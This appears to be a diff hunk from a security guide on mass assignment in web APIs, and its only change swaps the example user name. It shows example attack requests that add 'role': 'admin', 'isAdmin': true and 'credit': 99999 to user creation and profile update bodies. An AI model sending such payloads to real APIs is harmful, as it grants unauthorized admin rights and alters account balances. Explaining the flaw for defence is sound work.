@@ -126,15 +126,15 @@ app.post('/api/users', (req, res) => {
 
 # Normal request:
 POST /api/users
-{"name": "Alice", "email": "alice@example.com"}
+{"name": "Fatima", "email": "fatima@example.com"}
 
 # Attack — add admin:true to body
 POST /api/users
-{"name": "Alice", "email": "alice@example.com", "role": "admin", "isAdmin": true}
+{"name": "Fatima", "email": "fatima@example.com", "role": "admin", "isAdmin": true}
 
 # Update endpoint
 PUT /api/v1/users/profile
-{"name": "Alice", "email": "alice@example.com", "credit": 99999, "role": "admin"}
+{"name": "Fatima", "email": "fatima@example.com", "credit": 99999, "role": "admin"}
 
 # Find hidden fields:
 # GET the object first — what fields does it return?
